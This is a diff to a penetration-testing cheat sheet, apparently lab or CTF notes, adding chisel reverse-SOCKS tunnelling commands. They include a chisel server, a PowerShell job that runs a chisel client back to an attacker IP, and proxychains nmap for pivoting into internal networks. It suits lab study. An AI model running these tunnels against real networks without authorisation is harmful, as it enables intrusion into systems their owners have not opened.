@@ -797,10 +797,14 @@ nmap -Pn -sC -sV --script=vuln*.nse -p$ports 10.10.10.x -T5 -A      # Running nm
 
 ip route add 192.168.222.0/24 via 10.175.34.1	 # ADD ROUTE MANUALLY / PIVOTING
 
-chisel server -p 8000 --reverse 	# chisel server / PIVOTING
+socks5 127.0.0.1 48823	# Chisel - Change configuration
+chisel server -p 55555 --reverse --socks5 -v 	# chisel server / PIVOTING
 chisel client 10.10.14.54:8000 R:9001:localhost:9001 	# chisel client / port forward / PIVOTING
 chisel client 10.10.14.54:8000 R:socks 		# Chisel client / Dynamic / Socks5 / PIVOTING
 chisel client 10.10.14.54:8000 R:4444:10.10.10.240:80 	# Chisel Client / port forward to other machine in network / PIVOTING
+sudo proxychains -q nmap 	# Chisel - run nmap
+Start-Job { & "C:\tmp\chiselx64.exe" client -v --fingerprint "<Fingerprint>" 10.10.15.34:55555 R:48823:socks }		# Chisel - Windows Powershell
+
 
 meterpreter > run autoroute -s 172.30.111.0/24 		# metasploit / meterpreter add route / PIVOTING
 
